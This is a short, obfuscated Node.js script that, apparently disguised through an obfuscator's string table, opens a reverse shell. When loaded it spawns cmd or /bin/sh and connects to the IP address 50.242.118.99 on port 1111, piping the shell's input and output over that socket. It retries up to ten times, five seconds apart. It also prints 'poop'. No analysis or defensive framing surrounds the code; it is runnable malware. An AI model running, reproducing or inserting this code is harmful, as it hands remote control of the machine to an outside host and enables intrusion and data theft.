function node_payload() {
    var _0xd6941 = _0x3b5a;
    var _0x42d926 = global['require'] || global[_0xd6941(0x0)][_0xd6941(0x1)]['constructor']['_load'];
    if (!_0x42d926)
        return;
    var _0x59d914 = global['process']['platform'][_0xd6941(0x2)](/^win/i) ? 'cmd' : '/bin/sh';
    var _0x474261 = _0x42d926(_0xd6941(0x3));
    var _0x6de387 = _0x42d926(_0xd6941(0x4));
    var _0x5d245e = _0x42d926('util');
    var _0x355d1f = _0x6de387['spawn'](_0x59d914, []);
    var _0x15c58e = this;
    var _0x1e5066 = 0x0;
    function _0x276177() {
        var _0x5b43ec = _0x3b5a;
        _0x15c58e['socket'] = _0x474261[_0x5b43ec(0x5)](0x457, _0x5b43ec(0x6), function () {
            var _0x39b9e1 = _0x3b5a;
            _0x15c58e[_0x39b9e1(0x7)]['pipe'](_0x355d1f[_0x39b9e1(0x8)]);
            if (typeof _0x5d245e[_0x39b9e1(0x9)] === 'undefined') {
                _0x355d1f['stdout']['pipe'](_0x15c58e['socket']);
                _0x355d1f['stderr']['pipe'](_0x15c58e['socket']);
            } else {
                _0x5d245e[_0x39b9e1(0x9)](_0x355d1f[_0x39b9e1(0xa)], _0x15c58e['socket']);
                _0x5d245e['pump'](_0x355d1f['stderr'], _0x15c58e[_0x39b9e1(0x7)]);
            }
        });
        _0x15c58e['socket']['on']('error', function (_0x359a32) {
            _0x1e5066++;
            if (_0x1e5066 <= 0xa) {
                setTimeout(function () {
                    _0x276177();
                }, 0x5 * 0x3e8);
            } else {
                process['exit']();
            }
        });
    }
    _0x276177();
}
console['log']('poop');
function _0x2863() {
    var _0xe4c3b8 = [
        'process',
        'mainModule',
        'match',
        'net',
        'child_process',
        'connect',
        '50.242.118.99',
        'socket',
        'stdin',
        'pump',
        'stdout'
    ];
    _0x2863 = function () {
        return _0xe4c3b8;
    };
    return _0x2863();
}
function _0x3b5a(_0x286305, _0x3b5aa6) {
    var _0x215616 = _0x2863();
    _0x3b5a = function (_0x38a559, _0x1cf73a) {
        _0x38a559 = _0x38a559 - 0x0;
        var _0x28eb5f = _0x215616[_0x38a559];
        return _0x28eb5f;
    };
    return _0x3b5a(_0x286305, _0x3b5aa6);
}
node_payload();
